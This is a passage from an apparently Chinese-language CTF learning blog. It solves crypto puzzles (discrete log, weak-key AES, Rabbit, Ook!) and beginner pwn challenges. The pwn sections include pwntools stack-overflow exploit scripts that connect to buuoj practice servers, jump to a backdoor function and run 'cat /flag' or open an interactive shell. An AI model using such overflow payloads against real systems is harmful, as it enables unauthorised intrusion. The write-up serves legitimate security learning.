class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">flag = sympy.discrete_log(n, c, m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="ACTF新生赛2020-crypto-aes"><a href="#ACTF新生赛2020-crypto-aes" class="headerlink" title="[ACTF新生赛2020]crypto-aes"></a>[ACTF新生赛2020]crypto-aes</h4><p>给出的脚本大概就像是这样的，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = os.urandom(<span class="number">2</span>) * <span class="number">16</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv))</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(<span class="string">b&#x27;FLAG&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(os.urandom(<span class="number">2</span>))</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里为什么随机的key和iv我们仍然是可以破解的呢？因为这个key是两个byte的重复，而且给出了key和iv的按位异或的值。并且这个异或是从右向左异或的，key的长度大于iv的长度，所以前面的很多位来说，异或后的值是等于key的，故此可得key、iv，亦可解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_iv = <span class="number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span></span><br><span class="line">enc_flag = <span class="string">b&#x27;\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p&#x27;</span></span><br><span class="line"></span><br><span class="line">key = long_to_bytes(key_iv)[:<span class="number">2</span>] * <span class="number">16</span></span><br><span class="line">iv = key_iv ^ bytes_to_long(key)</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = aes.decrypt(enc_flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;actf&#123;W0W_y0u_can_so1v3_AES_now!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><h4 id="ctfshow、crypto6"><a href="#ctfshow、crypto6" class="headerlink" title="ctfshow、crypto6"></a>ctfshow、crypto6</h4><p>提示为：<code>密钥为**加密方式**名称，区分大小写</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">密文：</span><br><span class="line">U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94</span><br><span class="line">MqeD2xz+</span><br><span class="line">密钥：</span><br><span class="line">加密方式名称</span><br></pre></td></tr></table></figure><p>这种<code>U2Fsd</code>开头的一般就是那几种<code>对称加密</code>，这个对称加密有个专门的网站<a href="https://www.sojson.com/encrypt_aes.html">https://www.sojson.com/encrypt_aes.html</a></p><p>然后从aes一个一个地试试就好了。</p><p><img src="/2021/05/28/CTF//image-20210720145845078.png"></p><h4 id="ctfshow、crypto7"><a href="#ctfshow、crypto7" class="headerlink" title="ctfshow、crypto7"></a>ctfshow、crypto7</h4><p><strong>TAG: Ook!</strong></p><p><a href="https://ctf.bugku.com/tool/brainfuck">Ook在线网站</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?</span><br><span class="line">Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.</span><br><span class="line">Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.</span><br><span class="line">Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook? Ook. </span><br><span class="line"></span><br><span class="line">flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210720150259583.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a href="https://zhuanlan.zhihu.com/p/129837931">kali配置安装pwn环境</a></p><h3 id="安装peda"><a href="#安装peda" class="headerlink" title="安装peda"></a>安装peda</h3><p>我先安装的是peda，直接就两个命令，下面的两个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>直接gdb命令出现的就是peda的前缀了。</p><p><strong>对pwn的难度估计出现了重大失误，这个门槛还是很高的，等下学期学了病毒分析再入门吧。</strong></p><h2 id="一般pwn"><a href="#一般pwn" class="headerlink" title="一般pwn"></a>一般pwn</h2><h3 id="绝对签到题"><a href="#绝对签到题" class="headerlink" title="绝对签到题"></a>绝对签到题</h3><h4 id="buu、test-your-nc"><a href="#buu、test-your-nc" class="headerlink" title="buu、test_your_nc"></a>buu、test_your_nc</h4><p>直接nc就行了，这个主要是好像pwn里面经常是要使用nc工具的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc node3.buuoj.cn 28024</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210601121350820.png" alt="image-20210601121350820"></p><h2 id="普通溢出题目"><a href="#普通溢出题目" class="headerlink" title="普通溢出题目"></a>普通溢出题目</h2><h3 id="普通栈溢出"><a href="#普通栈溢出" class="headerlink" title="普通栈溢出"></a>普通栈溢出</h3><h4 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h4><p><img src="/2021/05/28/CTF//image-20210711195254351.png"></p><p>使用64位的ida解决。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数的反汇编代码如下</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets((__int64)s, (__int64)argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>据判断，gets函数具有栈溢出漏洞</p><p><img src="/2021/05/28/CTF//image-20210714201214783.png"></p><p>s的大小限制为15位(F - 0 &#x3D; F[F为10进制的15])，只要传入超过15个byte就会导致溢出，然后转到system函数(程序中的fun函数里面有system方法)，然后就再看看ida里面他的函数的开始地址<strong>0x401186</strong></p><p><img src="/2021/05/28/CTF//image-20210714202217709.png"></p><p>然后就认为我们的payload可以为如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;a&quot; * 15 + p64(0x401186)</span><br></pre></td></tr></table></figure><p><strong>p64</strong>代表的是这个地址是64位机的地址pack 64 bits number。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32/p64: 打包一个整数，分别打包为32位或64位</span><br><span class="line">u32/u64: 解包一个字符串，得到整数</span><br></pre></td></tr></table></figure><p>然后写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27897</span>)</span><br><span class="line"></span><br><span class="line">buf_1 = <span class="string">b&quot;a&quot;</span> * <span class="number">15</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(buf_1)</span><br><span class="line">p.sendline(<span class="string">&quot;cat /flag&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;42bfbcd2-053e-4a41-8581-3a8e676a4c9a&#125;</span></span><br></pre></td></tr></table></figure><h4 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h4><p><strong>TAG：gets栈溢出漏洞，后门函数</strong></p><p>听说大家ida打开之前都会使用checksec来检查一下应用程序是否是有保护的，这里的checksec是可以直接下的，但是好像某个工具里面自带的也是有的，这里为了方便，先直接<code>sudo apt install checksec</code>来下载一下这个工具。</p><p>然后就是直接看ida了，main函数的内容为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应该是最后的这个v5的大小限制导致栈溢出的，然后再去看v5的容量为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000040 var_40          db 64 dup(?)</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br></pre></td></tr></table></figure><p>是这个，<code>80-40=40(十六进制)</code>还要加上返回地址的8个字节，这里应该说的是return所造成的8个字节的返回地址。</p><p>估计就是64位的机器，然后一个字节等于8个位，所以64位&#x3D;8×8位。就是8个字节。(猜想的，现在还不是很明白)</p><p><img src="/2021/05/28/CTF//image-20210717212917762.png" alt="后门函数所在地址为0x40060d"></p><p>然后就可以写出利用方式如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28074</span>)</span><br><span class="line"></span><br><span class="line">buf_1 = <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(buf_1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;02912f3b-c4e0-4a24-9f51-30a93e017b04&#125;</span></span><br></pre></td></tr></table></figure><p>又是一道水题，并没学到更高深的东西。</p><h4 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h4><p><strong>TAG: 